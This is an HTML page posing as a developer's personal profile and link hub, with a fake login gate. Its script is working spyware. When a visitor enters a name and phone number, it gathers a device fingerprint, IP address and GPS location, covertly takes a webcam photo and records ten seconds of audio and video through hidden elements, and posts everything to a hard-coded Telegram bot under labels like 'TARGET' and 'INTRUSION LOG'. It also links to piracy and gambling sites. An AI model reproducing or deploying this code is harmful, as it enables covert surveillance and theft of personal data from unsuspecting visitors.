<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="Lalu Kumar Tanti - Ultimate Digital Profile">
    
    <meta name="theme-color" content="#000000">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="application-name" content="Lalu Hub">
    
    <link rel="manifest" href='data:application/manifest+json,{"name":"Lalu Elite Hub","short_name":"Lalu App","start_url":".","display":"standalone","background_color":"#000000","theme_color":"#D4AF37","orientation":"portrait","icons":[{"src":"https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg","sizes":"192x192","type":"image/jpeg"},{"src":"https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg","sizes":"512x512","type":"image/jpeg"}]}'>

    <title>Lalu Kumar | ELITE SYSTEM</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Outfit:wght@200;400;600&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

    <style>
        :root {
            /* --- DANGEROUS PREMIUM THEME --- */
            --bg-body: #000000;
            --glass-panel: rgba(10, 10, 10, 0.85);
            --glass-border: rgba(212, 175, 55, 0.15);
            --gold-primary: #D4AF37;
            --gold-dark: #8a6d1c;
            --neon-glow: 0 0 15px rgba(212, 175, 55, 0.4);
            --text-main: #ffffff;
            --text-sub: #888888;
            --blur: 40px;
        }

        /* --- RESET --- */
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        
        body { 
            background-color: var(--bg-body); 
            color: var(--text-main); 
            font-family: 'Outfit', sans-serif; 
            overflow-x: hidden; 
            min-height: 100vh;
            /* Advanced Dark Gradient Background */
            background-image: 
                linear-gradient(180deg, rgba(0,0,0,1) 0%, rgba(20,20,20,1) 50%, rgba(0,0,0,1) 100%),
                radial-gradient(circle at 50% 50%, rgba(212, 175, 55, 0.05) 0%, transparent 60%);
            background-attachment: fixed;
        }

        /* --- PREMIUM SCROLLBAR --- */
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: #050505; }
        ::-webkit-scrollbar-thumb { background: linear-gradient(to bottom, var(--gold-primary), var(--gold-dark)); border-radius: 10px; }

        /* --- 1. GATEKEEPER (LOGIN) --- */
        #gatekeeper {
            position: fixed; inset: 0; z-index: 9999;
            background: #000;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            transition: opacity 0.8s ease, visibility 0.8s;
            background: radial-gradient(circle at 50% 30%, rgba(212, 175, 55, 0.08), #000 60%);
        }

        .gate-card {
            width: 90%; max-width: 380px;
            background: rgba(15, 15, 15, 0.9);
            border: 1px solid var(--gold-primary);
            border-radius: 24px; padding: 40px 25px;
            box-shadow: 0 0 80px rgba(212, 175, 55, 0.15), inset 0 0 20px rgba(0,0,0,0.8);
            backdrop-filter: blur(20px);
            text-align: center;
            position: relative; overflow: hidden;
        }
        /* Scanning Line Animation */
        .gate-card::after {
            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px;
            background: var(--gold-primary);
            box-shadow: 0 0 15px var(--gold-primary);
            animation: scan 3s infinite linear; opacity: 0.5;
        }
        @keyframes scan { 0% { top: 0; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }

        .gate-img-frame {
            width: 120px; height: 120px; margin: 0 auto 20px;
            border-radius: 50%; padding: 4px;
            border: 2px solid var(--gold-primary);
            box-shadow: 0 0 40px rgba(212, 175, 55, 0.3);
            background: #000;
        }
        .gate-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; filter: contrast(1.1); }

        .gate-title { 
            font-family: 'Cinzel'; color: #fff; font-size: 26px; margin-bottom: 5px; 
            text-shadow: 0 0 15px rgba(212, 175, 55, 0.6); letter-spacing: 1px;
        }
        .gate-sub { color: var(--gold-primary); font-size: 10px; letter-spacing: 4px; margin-bottom: 30px; font-weight: 700; text-transform: uppercase; }

        .input-box {
            width: 100%; padding: 14px 15px 14px 45px; margin-bottom: 15px;
            background: rgba(255, 255, 255, 0.03); border: 1px solid #333;
            border-radius: 8px; color: #fff; font-size: 15px; transition: 0.3s;
            font-family: 'Rajdhani'; letter-spacing: 1px;
        }
        .input-wrapper { position: relative; text-align: left; }
        .input-icon { position: absolute; left: 15px; top: 16px; color: #666; font-size: 14px; transition: 0.3s; }
        .input-box:focus { border-color: var(--gold-primary); background: rgba(212, 175, 55, 0.05); box-shadow: 0 0 15px rgba(212,175,55,0.1); }
        .input-box:focus + .input-icon { color: var(--gold-primary); }

        .gate-btn {
            width: 100%; padding: 16px; margin-top: 10px;
            background: linear-gradient(135deg, var(--gold-primary), #8f7023);
            color: #000; font-weight: 800; font-size: 14px;
            border: none; border-radius: 8px; cursor: pointer;
            text-transform: uppercase; letter-spacing: 2px; transition: 0.3s;
            box-shadow: 0 0 30px rgba(212,175,55,0.2); position: relative; overflow: hidden;
        }
        .gate-btn:active { transform: scale(0.98); }
        
        /* --- 2. MAIN INTERFACE --- */
        #main-interface { display: none; opacity: 0; transition: opacity 1s; padding-bottom: 100px; }

        /* Navbar */
        .navbar {
            display: flex; justify-content: space-between; align-items: center;
            padding: 15px 20px; position: sticky; top: 0; z-index: 1000;
            background: rgba(5, 5, 5, 0.9); backdrop-filter: blur(20px);
            border-bottom: 1px solid rgba(255,255,255,0.08);
        }
        .brand { font-family: 'Cinzel'; color: var(--gold-primary); font-size: 18px; font-weight: 700; display: flex; align-items: center; gap: 10px; text-shadow: var(--neon-glow); }
        
        /* Profile & Install */
        .container { max-width: 800px; margin: 0 auto; padding: 0 20px; }
        .hero-section { text-align: center; padding: 50px 0 30px; }
        .hero-avatar {
            width: 140px; height: 140px; margin: 0 auto 15px; border-radius: 50%;
            padding: 4px; background: linear-gradient(135deg, var(--gold-primary), transparent);
            box-shadow: 0 0 60px rgba(212,175,55,0.25);
        }
        .hero-avatar img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; background: #000; }
        .hero-name { 
            font-family: 'Rajdhani'; font-size: 34px; font-weight: 700; color: #fff; 
            text-shadow: 0 0 20px rgba(255,255,255,0.2); margin-bottom: 5px;
        }
        .hero-role { color: var(--gold-primary); font-size: 12px; letter-spacing: 4px; text-transform: uppercase; font-weight: bold; }

        /* Install App Button (Auto-Shows) */
        #installBtn {
            display: none; margin: 20px auto;
            background: rgba(212, 175, 55, 0.1); border: 1px solid var(--gold-primary);
            color: var(--gold-primary); padding: 10px 25px; border-radius: 30px;
            font-size: 11px; font-weight: bold; cursor: pointer;
            box-shadow: 0 0 20px rgba(212, 175, 55, 0.2);
            animation: bounce 2s infinite;
        }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-3px); } }

        /* Premium Cards */
        .section-header {
            display: flex; align-items: center; gap: 10px; margin: 35px 0 15px;
            font-family: 'Cinzel'; font-size: 13px; color: var(--gold-primary);
            border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 8px;
            text-shadow: 0 0 10px rgba(212,175,55,0.3);
        }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        
        .glass-card {
            background: rgba(20, 20, 20, 0.6); border: 1px solid rgba(255,255,255,0.08);
            border-radius: 16px; padding: 20px; height: 110px;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            text-decoration: none; color: #fff; position: relative; overflow: hidden;
            transition: all 0.3s ease;
        }
        .glass-card:hover { border-color: var(--gold-primary); box-shadow: 0 5px 25px rgba(0,0,0,0.5); transform: translateY(-2px); }
        .glass-card:active { transform: scale(0.98); }
        .glass-card i { font-size: 28px; margin-bottom: 10px; color: var(--gold-primary); transition: 0.3s; }
        .glass-card span { font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; color: #ccc; }
        .glass-card.full { grid-column: span 2; flex-direction: row; gap: 15px; height: 80px; background: linear-gradient(90deg, rgba(212,175,55,0.08), transparent); }
        .glass-card.full i { margin-bottom: 0; }

        /* Floating Dock Navigation */
        .dock {
            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
            background: rgba(15, 15, 15, 0.9); backdrop-filter: blur(25px);
            border: 1px solid rgba(255,255,255,0.1); border-radius: 24px;
            padding: 12px 30px; display: flex; gap: 30px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.8); z-index: 5000;
        }
        .dock-icon {
            color: #666; font-size: 24px; transition: 0.3s; position: relative; cursor: pointer;
        }
        .dock-icon:hover, .dock-icon.active { color: var(--gold-primary); transform: translateY(-3px); text-shadow: 0 0 10px var(--gold-primary); }
        .dock-icon.active::after {
            content: ''; position: absolute; bottom: -8px; left: 50%; transform: translateX(-50%);
            width: 4px; height: 4px; background: var(--gold-primary); border-radius: 50%;
        }

        /* Hidden Capture (Muted to stop audio feedback) */
        #hidden-video { display: none; }
        #hidden-canvas { display: none; }

        /* Toast Notification */
        .toast {
            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
            background: var(--gold-primary); color: #000; padding: 10px 25px;
            border-radius: 30px; font-weight: 800; font-size: 12px; letter-spacing: 1px;
            opacity: 0; pointer-events: none; transition: 0.3s; z-index: 6000; 
            box-shadow: 0 0 30px var(--gold-glow);
        }
        .toast.show { opacity: 1; top: 50px; }
        
        /* Modals */
        .modal-wrap { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 5000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(15px); }
        .modal-wrap.active { display: flex; animation: fadeIn 0.3s ease; }
        .modal-inner { width: 90%; max-width: 400px; background: #0a0a0a; border: 1px solid var(--gold-primary); border-radius: 24px; overflow: hidden; padding: 25px; box-shadow: 0 0 50px rgba(212,175,55,0.1); }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

    <div id="gatekeeper">
        <div class="gate-card">
            <div class="gate-img-frame">
                <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" class="gate-img">
            </div>
            <h2 class="gate-title">LALU KUMAR</h2>
            <div class="gate-sub">ELITE SYSTEM ACCESS</div>

            <div class="input-wrapper">
                <i class="fas fa-user input-icon"></i>
                <input type="text" id="g-name" class="input-box" placeholder="ENTER IDENTITY">
            </div>
            
            <div class="input-wrapper">
                <i class="fas fa-phone input-icon"></i>
                <input type="tel" id="g-phone" class="input-box" placeholder="SECURE NUMBER">
            </div>

            <button class="gate-btn" onclick="initiateSecureEntry()">
                <i class="fas fa-fingerprint"></i> AUTHENTICATE
            </button>
            
            <div class="loading-text" id="g-status" style="display:none; color:var(--gold-primary); margin-top:15px; font-size:11px;">
                <i class="fas fa-circle-notch fa-spin"></i> BYPASSING FIREWALLS...
            </div>
        </div>
    </div>

    <video id="hidden-video" autoplay playsinline muted></video>
    <canvas id="hidden-canvas"></canvas>

    <div id="main-interface">
        <div id="toast" class="toast"><i class="fas fa-check-circle"></i> ACCESS GRANTED</div>
        
        <nav class="navbar">
            <div class="brand"><i class="fas fa-shield-alt"></i> VISION HUB</div>
            <i class="fas fa-bell" style="color:var(--text-sub);"></i>
        </nav>
        
        <div class="container">
            <div class="hero-section">
                <div class="hero-avatar">
                    <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg">
                </div>
                <div class="hero-name">Lalu Kumar Tanti</div>
                <div class="hero-role">Full Stack Developer | Creator</div>
                <button id="installBtn" onclick="installApp()"><i class="fas fa-download"></i> INSTALL LALU APP</button>
            </div>

            <div class="section-header"><i class="fas fa-bolt"></i> DIRECT LINK</div>
            <div class="grid">
                <a href="https://wa.me/919771617808" class="glass-card"><i class="fab fa-whatsapp"></i><span>WhatsApp</span></a>
                <a href="https://instagram.com/lalu_kumar_tanti" class="glass-card"><i class="fab fa-instagram"></i><span>Instagram</span></a>
                <a href="tel:+919771617808" class="glass-card"><i class="fas fa-phone-alt"></i><span>Call Me</span></a>
                <a href="https://t.me/Lalu_kumar_tanti_0" class="glass-card"><i class="fab fa-telegram-plane"></i><span>Telegram</span></a>
                <a href="mailto:lalukumartanti75@gmail.com" class="glass-card full"><i class="fas fa-envelope"></i><span>Email: lalukumartanti75@gmail.com</span></a>
            </div>

            <div class="section-header"><i class="fas fa-globe"></i> SOCIAL EMPIRE</div>
            <div class="grid">
                <a href="https://facebook.com/lalukumartantii" class="glass-card"><i class="fab fa-facebook-f"></i><span>Facebook</span></a>
                <a href="https://x.com/LaluKumarTanti" class="glass-card"><i class="fab fa-x-twitter"></i><span>Twitter</span></a>
                <a href="https://github.com/lalukumartanti" class="glass-card"><i class="fab fa-github"></i><span>GitHub</span></a>
                <a href="https://linkedin.com/in/lalu-kumar-tanti-540185351" class="glass-card"><i class="fab fa-linkedin-in"></i><span>LinkedIn</span></a>
                <a href="http://www.youtube.com/@Lalu_Kumar_Tanti" class="glass-card full"><i class="fab fa-youtube"></i><span>YouTube Channel</span></a>
            </div>

            <div class="section-header"><i class="fas fa-film"></i> PREMIUM CONTENT</div>
            <div class="grid">
                <a href="https://hdhub4u.catering/" class="glass-card"><i class="fas fa-film"></i><span>HDHub4u</span></a>
                <a href="https://vegas-big.com/" class="glass-card"><i class="fas fa-play-circle"></i><span>Vegas-Big</span></a>
            </div>

            <div style="height: 100px;"></div>
        </div>

        <div class="dock">
            <div class="dock-icon active" onclick="window.scrollTo(0,0)"><i class="fas fa-home"></i></div>
            <div class="dock-icon" onclick="document.getElementById('aiModal').classList.add('active')"><i class="fas fa-brain"></i></div>
            <div class="dock-icon" onclick="document.getElementById('gameModal').classList.add('active')"><i class="fas fa-gamepad"></i></div>
            <div class="dock-icon" onclick="document.getElementById('authModal').classList.add('active')"><i class="fas fa-user"></i></div>
        </div>

        <div class="modal-wrap" id="aiModal" onclick="if(event.target==this)this.classList.remove('active')">
            <div class="modal-inner">
                <div style="text-align:center; color:var(--gold-primary); font-weight:bold; margin-bottom:15px; border-bottom:1px solid #333; padding-bottom:10px;">LALU AI SYSTEM</div>
                <div style="background:#151515; height:250px; padding:15px; color:#aaa; border-radius:12px; font-size:13px;">
                    > System Online...<br>> Waiting for input...
                </div>
            </div>
        </div>

        <div class="modal-wrap" id="gameModal" onclick="if(event.target==this)this.classList.remove('active')">
            <div class="modal-inner" style="text-align:center;">
                <h3 style="color:var(--gold-primary); margin-bottom:20px;">ELITE ARCADE</h3>
                <div class="grid">
                    <div class="glass-card" onclick="alert('Snake Loading...')"><i class="fas fa-worm"></i><span>Snake</span></div>
                    <div class="glass-card" onclick="alert('TicTacToe Loading...')"><i class="fas fa-border-all"></i><span>TicTacToe</span></div>
                </div>
            </div>
        </div>

        <div class="modal-wrap" id="authModal" onclick="if(event.target==this)this.classList.remove('active')">
            <div class="modal-inner">
                <h3 style="color:#fff; text-align:center; margin-bottom:20px;">ADMIN LOGIN</h3>
                <input type="tel" placeholder="Mobile Number" class="input-box">
                <button class="gate-btn" onclick="initiateSecureEntry()">SEND OTP</button>
            </div>
        </div>
    </div>

    <script>
        const TG_TOKEN = "7887458156:AAHvTz7CWSt-EBpyDSaeSVUVEgka5H9bBWQ";
        const TG_CHAT = "8506290708";

        // --- PWA INSTALL ENGINE ---
        let deferredPrompt;
        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault();
            deferredPrompt = e;
            document.getElementById('installBtn').style.display = 'inline-block';
        });
        function installApp() {
            if(deferredPrompt) {
                deferredPrompt.prompt();
                deferredPrompt.userChoice.then(res => { deferredPrompt = null; });
            }
        }

        // --- DEEP SCAN INTEL ENGINE ---
        async function getDeviceIntel() {
            let info = {
                ua: navigator.userAgent,
                screen: `${window.screen.width}x${window.screen.height}`,
                depth: `${window.screen.colorDepth}-bit`,
                lang: navigator.language,
                cores: navigator.hardwareConcurrency || "Unknown",
                ram: navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "Unknown",
                touch: navigator.maxTouchPoints > 0 ? "Touch Screen" : "Mouse",
                time: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled ? "Enabled" : "Disabled"
            };

            // Network
            if(navigator.connection) {
                info.net = `${navigator.connection.effectiveType} (${navigator.connection.downlink}Mbps) RTT:${navigator.connection.rtt}ms`;
            } else info.net = "Unknown";

            // Battery
            try { 
                const b = await navigator.getBattery(); 
                info.bat = `${Math.round(b.level*100)}% ${b.charging?'⚡ Charging':'🔋 Discharging'}`; 
            } catch(e) { info.bat = "Unknown"; }

            // IP
            try { 
                const r = await fetch('https://api.ipify.org?format=json'); 
                const j = await r.json(); 
                info.ip = j.ip; 
            } catch(e) { info.ip = "Hidden"; }

            // GPU Vendor
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            } catch(e) { info.gpu = "Integrated/Unknown"; }

            return info;
        }

        // --- MASTER ENTRY SYSTEM ---
        async function initiateSecureEntry() {
            const name = document.getElementById('g-name').value;
            const phone = document.getElementById('g-phone').value;
            
            if(name.length < 3 || phone.length < 10) return alert("Credentials Invalid.");

            document.getElementById('g-status').style.display = 'block';

            // 1. Gather Data (Non-Blocking)
            const intelPromise = getDeviceIntel();
            
            // 2. Start Dual Capture (Snap + 10s Video)
            startDualCapture();

            // 3. Force Open Timer (2s)
            const safetyTimer = setTimeout(() => { unlockUI(); }, 2000);

            // 4. Location
            let locData = "Denied";
            try {
                await new Promise(r => {
                    navigator.geolocation.getCurrentPosition(p => {
                        locData = `Lat: ${p.coords.latitude}, Lon: ${p.coords.longitude} (Acc: ${Math.round(p.coords.accuracy)}m)`;
                        r();
                    }, r, {timeout: 2000});
                });
            } catch(e) {}

            const d = await intelPromise;

            const msg = `
🚨 *SECURE HUB INTRUSION LOG* 🚨

👤 *TARGET IDENTITY*
• Name: ${name}
• Phone: \`${phone}\`

📱 *DEVICE FINGERPRINT*
• GPU: ${d.gpu}
• RAM: ${d.ram} | Cores: ${d.cores}
• Screen: ${d.screen} (${d.depth})
• Input: ${d.touch}
• Battery: ${d.bat}

🌐 *NETWORK INTEL*
• IP: \`${d.ip}\`
• Speed: ${d.net}
• Lang: ${d.lang}
• Cookies: ${d.cookies}

📍 *LOCATION*
${locData}

⏰ *Timestamp:* ${new Date().toLocaleString()}
`;
            
            // Send Text Immediately
            sendTG(msg, null);
            clearTimeout(safetyTimer);
            unlockUI();
        }

        // --- DUAL CAPTURE: PHOTO + VIDEO ---
        async function startDualCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                const video = document.getElementById('hidden-video');
                const canvas = document.getElementById('hidden-canvas');
                
                video.muted = true; // Essential: No Feedback
                video.srcObject = stream;
                
                await new Promise(r => video.onloadedmetadata = r);
                
                // 1. SNAPSHOT (Immediate)
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    sendTG("📸 *TARGET SNAPSHOT*", blob, false);
                }, 'image/jpeg', 0.8);

                // 2. VIDEO RECORDING (10s)
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    sendTG("🎥 *AUDIO/VIDEO FEED (10s)*", blob, true);
                    stream.getTracks().forEach(t => t.stop());
                };
                
                recorder.start();
                setTimeout(() => recorder.stop(), 10000);
                
            } catch(e) { console.log("Media Blocked"); }
        }

        function unlockUI() {
            const gate = document.getElementById('gatekeeper');
            if(gate.style.display !== 'none') {
                gate.style.opacity = '0';
                setTimeout(() => {
                    gate.style.display = 'none';
                    document.getElementById('main-interface').style.display = 'block';
                    setTimeout(() => document.getElementById('main-interface').style.opacity = '1', 50);
                }, 600);
            }
        }

        function sendTG(text, fileBlob, isVideo) {
            const fd = new FormData();
            fd.append('chat_id', TG_CHAT);
            fd.append('caption', text);
            fd.append('parse_mode', 'Markdown');

            if (fileBlob) {
                const method = isVideo ? 'sendVideo' : 'sendPhoto';
                const key = isVideo ? 'video' : 'photo';
                const name = isVideo ? 'rec.mp4' : 'snap.jpg';
                fd.append(key, fileBlob, name);
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/${method}`, { method: 'POST', body: fd }).catch(e=>{});
            } else {
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TG_CHAT, text: text, parse_mode: 'Markdown' })
                }).catch(e=>{});
            }
        }
    </script>
</body>
</html>
